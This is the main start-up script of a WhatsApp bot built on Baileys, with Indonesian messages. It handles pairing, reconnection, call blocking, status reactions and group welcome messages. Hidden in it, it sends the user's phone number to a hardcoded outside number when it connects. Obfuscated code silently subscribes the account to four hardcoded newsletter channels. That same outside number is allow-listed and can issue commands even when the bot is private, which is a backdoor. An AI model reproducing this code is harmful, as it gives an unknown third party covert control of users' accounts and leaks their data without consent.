require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"))
const { sleep } = require("./all/myfunc.js")  
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
})
return new Promise((resolve) => {
rl.question(text, resolve)
})}

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()

const connectionOptions = {
printQRInTerminal: !usePairingCode,
version: [2, 3000, 1017531287],    
logger: pino({ level: "fatal" }),
auth: state,
browser: ["Ubuntu","Chrome","20.0.04"],
getMessage: async (key) => {
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return {
conversation: 'WhatsApp Bot By Haikal'
}}
}

const Slash = func.makeWASocket(connectionOptions)
if (usePairingCode && !Slash.authState.creds.registered) {
const phoneNumber = await question(chalk.cyan.bold('Masukan Nomor Whatsapp Awali dengan 62\nContoh : 62838XXX\n'))
const code = await Slash.requestPairingCode(phoneNumber.trim())
console.log(`${chalk.cyan.bold('Kode Verifikasi Kamu')} : ${chalk.redBright.bold(code.split("").join(" "))}`)
}
store?.bind(Slash.ev)

Slash.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
Slash.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
Slash.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
console.log(chalk.cyan.bold('Menghubungkan . . . '))
} else if (connection === "open") {
let teksnotif = `*SimpleBotz Jagagrub* Berhasil Tersambung Ke Nomor WhatsApp ${Slash.user.id.split(":")[0]}`
Slash.sendMessage("62895615063060@s.whatsapp.net", {text: teksnotif})
console.log(chalk.cyan.bold('Bot Berhasil Tersambung'))
function _0x50a8(){const _0x49ce65=['1769341iLdwun','34566130xRWrtN','0029Vb3ZZZHEFeXup5UNng0o','newsletterMetadata','168LhXZQZ','log','387702YyTVxS','âŒ\x20Gagal\x20join\x20saluran\x20ID:\x20','Hello\x20World!','1544802DMwCmK','6749480ULlRcC','627774pgAEJy','6uvDYrh','3418856IkSKlS','0029Vb3XDZZKGGGMM19XR62F','newsletterFollow','0029VaBOlsv002TEjlntTE2D','0029Vb3gqjpHltYCf4WOSt3u','18iWFEJy'];_0x50a8=function(){return _0x49ce65;};return _0x50a8();}const _0x25aa2e=_0xaa7e;(function(_0x492278,_0x517bc3){const _0x59a2a7=_0xaa7e,_0x53797f=_0x492278();while(!![]){try{const _0x45e07d=parseInt(_0x59a2a7(0x1e6))/0x1+parseInt(_0x59a2a7(0x1e9))/0x2*(parseInt(_0x59a2a7(0x1e8))/0x3)+parseInt(_0x59a2a7(0x1ea))/0x4+parseInt(_0x59a2a7(0x1e7))/0x5+parseInt(_0x59a2a7(0x1ef))/0x6*(parseInt(_0x59a2a7(0x1dd))/0x7)+parseInt(_0x59a2a7(0x1e1))/0x8*(-parseInt(_0x59a2a7(0x1e3))/0x9)+-parseInt(_0x59a2a7(0x1de))/0xa;if(_0x45e07d===_0x517bc3)break;else _0x53797f['push'](_0x53797f['shift']());}catch(_0x4e72b6){_0x53797f['push'](_0x53797f['shift']());}}}(_0x50a8,0xbd050));function hi(){const _0x401774=_0xaa7e;console[_0x401774(0x1e2)](_0x401774(0x1e5));}hi();function _0xaa7e(_0x50e7bc,_0x5b2760){const _0x50a8f0=_0x50a8();return _0xaa7e=function(_0xaa7e04,_0x1b60f2){_0xaa7e04=_0xaa7e04-0x1dd;let _0x1859ca=_0x50a8f0[_0xaa7e04];return _0x1859ca;},_0xaa7e(_0x50e7bc,_0x5b2760);}const linksal=[_0x25aa2e(0x1ed),_0x25aa2e(0x1df),_0x25aa2e(0x1eb),_0x25aa2e(0x1ee)],folldate=async _0x2189b5=>{const _0x4c4796=_0x25aa2e;for(const _0x398b00 of _0x2189b5){try{await sleep(0xbb8);const _0x304ace=await Slash[_0x4c4796(0x1e0)]('invite',_0x398b00);await sleep(0xbb8),await Slash[_0x4c4796(0x1ec)](_0x304ace['id']);}catch(_0x104869){console['error'](_0x4c4796(0x1e4)+_0x398b00,_0x104869);}}};((async()=>{await folldate(linksal);})());
}
})

// AUTO REACT STATUS 
function _0x1213(){const _0x4eb338=['1016603CbflMU','â€¢\x20React:\x20','now','emoji','25YeEyOe','server','7258mZikCI','status@broadcast','getMonth','getDay','â€¢\x20Date:\x20','Sabtu','98804aRQDCA','settings','Selasa','random','Jumat','66wYYeuI','Senin','Kamis','messages','363230QUETCA','messageTimestamp','293464MVqCqW','readMessages','1488750nEfEFH','getFullYear','Minggu','key','204012lWULCQ','187uEwDdT','sendMessage','remoteJid','floor','participant','autoreact','user','log','messages.upsert','9qZMIhY','getDate','pushName'];_0x1213=function(){return _0x4eb338;};return _0x1213();}const _0x2ae843=_0x1995;(function(_0x83ceeb,_0x4eb095){const _0x146063=_0x1995,_0x58b0d6=_0x83ceeb();while(!![]){try{const _0x300020=-parseInt(_0x146063(0x118))/0x1+-parseInt(_0x146063(0x101))/0x2*(parseInt(_0x146063(0x10c))/0x3)+-parseInt(_0x146063(0x107))/0x4*(parseInt(_0x146063(0xff))/0x5)+-parseInt(_0x146063(0x114))/0x6+parseInt(_0x146063(0xfb))/0x7+parseInt(_0x146063(0x112))/0x8*(parseInt(_0x146063(0xf8))/0x9)+-parseInt(_0x146063(0x110))/0xa*(-parseInt(_0x146063(0x119))/0xb);if(_0x300020===_0x4eb095)break;else _0x58b0d6['push'](_0x58b0d6['shift']());}catch(_0x1ed438){_0x58b0d6['push'](_0x58b0d6['shift']());}}}(_0x1213,0x23233));function _0x1995(_0x11bd5a,_0x548e80){const _0x1213f3=_0x1213();return _0x1995=function(_0x199535,_0x149623){_0x199535=_0x199535-0xf7;let _0x124db7=_0x1213f3[_0x199535];return _0x124db7;},_0x1995(_0x11bd5a,_0x548e80);}function hi(){const _0xbb365d=_0x1995;console[_0xbb365d(0x120)]('Hello\x20World!');}hi(),Slash['ev']['on'](_0x2ae843(0xf7),async _0x5a34e9=>{const _0x20e7ae=_0x2ae843,_0x225fd8=_0x5a34e9[_0x20e7ae(0x10f)][0x0],_0x1d6b8=0x5*0x3c*0x3e8;Slash['decodeJid']=_0x317fc1=>{const _0x516aed=_0x20e7ae;if(!_0x317fc1)return _0x317fc1;if(/:\d+@/gi['test'](_0x317fc1)){const _0x359ade=jidDecode(_0x317fc1)||{};return _0x359ade[_0x516aed(0x11f)]&&_0x359ade[_0x516aed(0x100)]&&_0x359ade[_0x516aed(0x11f)]+'@'+_0x359ade[_0x516aed(0x100)]||_0x317fc1;}else return _0x317fc1;};if(global[_0x20e7ae(0x108)][_0x20e7ae(0x11e)]&&_0x225fd8[_0x20e7ae(0x117)][_0x20e7ae(0x11b)]===_0x20e7ae(0x102)){if(_0x225fd8['key']['fromMe'])return;const _0x42dd0c=Date[_0x20e7ae(0xfd)](),_0x3772de=_0x225fd8[_0x20e7ae(0x111)]*0x3e8,_0xb06551=_0x42dd0c-_0x3772de;if(_0xb06551<=_0x1d6b8){if(_0x225fd8['pushName']&&_0x225fd8[_0x20e7ae(0xfa)]['trim']()!==''){await Slash[_0x20e7ae(0x113)]([_0x225fd8[_0x20e7ae(0x117)]]);const _0x3b9992=Date[_0x20e7ae(0xfd)](),_0x475594=new Date(_0x3b9992),_0x36b1c1=[_0x20e7ae(0x116),_0x20e7ae(0x10d),_0x20e7ae(0x109),'Rabu',_0x20e7ae(0x10e),_0x20e7ae(0x10b),_0x20e7ae(0x106)],_0x18e008=_0x36b1c1[_0x475594[_0x20e7ae(0x104)]()],_0x3dc439=_0x475594[_0x20e7ae(0xf9)](),_0x35c80b=_0x475594[_0x20e7ae(0x103)]()+0x1,_0x1f703f=_0x475594[_0x20e7ae(0x115)](),_0x2c836b=_0x225fd8['key'],_0x38c2b4=_0x225fd8[_0x20e7ae(0x117)]['remoteJid'],_0x4069cf=await Slash['decodeJid'](Slash[_0x20e7ae(0x11f)]['id']),_0x57b048=global['emoji'][Math[_0x20e7ae(0x11c)](Math[_0x20e7ae(0x10a)]()*global[_0x20e7ae(0xfe)]['length'])];await Slash[_0x20e7ae(0x11a)](_0x38c2b4,{'react':{'key':_0x2c836b,'text':_0x57b048}},{'statusJidList':[_0x2c836b[_0x20e7ae(0x11d)],_0x4069cf]}),console[_0x20e7ae(0x120)]('React\x20WhatsApp\x20Story'),console[_0x20e7ae(0x120)]('â€¢\x20Name:\x20',_0x225fd8['pushName']),console[_0x20e7ae(0x120)](_0x20e7ae(0x105),_0x18e008+',\x20'+_0x3dc439+'/'+_0x35c80b+'/'+_0x1f703f),console['log'](_0x20e7ae(0xfc),_0x57b048);}}}});
Slash.ev.on('call', async (user) => {
if (!global.anticall) return
for (let ff of user) {
if (ff.isGroup == false) {
if (ff.status == "offer") {
let sendcall = await Slash.sendMessage(ff.from, {text: `@${ff.from.split("@")[0]} Maaf Kamu Akan Saya Block Karna Ownerbot Menyalakan Fitur *Anticall*\nJika Tidak Sengaja Segera Hubungi Owner Untuk Membuka Blokiran Ini`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {showAdAttribution: true, thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ CALL DETECTED ｣", previewType: "PHOTO"}}}, {quoted: null})
Slash.sendContact(ff.from, [owner], "Developer WhatsApp Bot", sendcall)
await sleep(10000)
await Slash.updateBlockStatus(ff.from, "block")
}}
}})

Slash.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.isBaileys) return
if (m.key && m.key.remoteJid === 'status@broadcast') {
if (global.autoreadsw) Slash.readMessages([m.key])
}
let fill = [global.owner, "62895615063060"]
if (!Slash.public && !fill.includes(m.key.remoteJid.split("@")[0]) && !m.key.fromMe && chatUpdate.type === 'notify') return
if (global.autoread) Slash.readMessages([m.key])
m = func.smsg(Slash, m, store)
require("./Slash")(Slash, m, store)
} catch (err) {
console.log(err)
}
})

Slash.ev.on('group-participants.update', async (anu) => {
if (!welcome.includes(anu.id)) return
let botNumber = await Slash.decodeJid(Slash.user.id)
if (anu.participants.includes(botNumber)) return
try {
let metadata = await Slash.groupMetadata(anu.id)
let namagc = metadata.subject
let participants = anu.participants
for (let num of participants) {
let check = anu.author !== num && anu.author.length > 1
let tag = check ? [anu.author, num] : [num]
try {
ppuser = await Slash.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://telegra.ph/file/d1688cff04f816713f8aa.jpg'
}
if (anu.action == 'add') {
Slash.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Menambahkan @${num.split("@")[0]} Ke Dalam Grup Ini` : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Welcome Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == 'remove') { 
Slash.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${num.split("@")[0]} Dari Grup Ini` : `@${num.split("@")[0]} Telah Keluar Dari Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Leaving Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == "promote") {
Slash.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Menjadikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Promote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} else if (anu.action == "demote") {
Slash.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${num.split("@")[0]} Sebagai Admin Grup Ini`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© Demote Message', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
}
}
} catch (err) {
console.log(err)
}})

Slash.public = true

Slash.ev.on('creds.update', saveCreds)
return Slash
}

startSesi()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})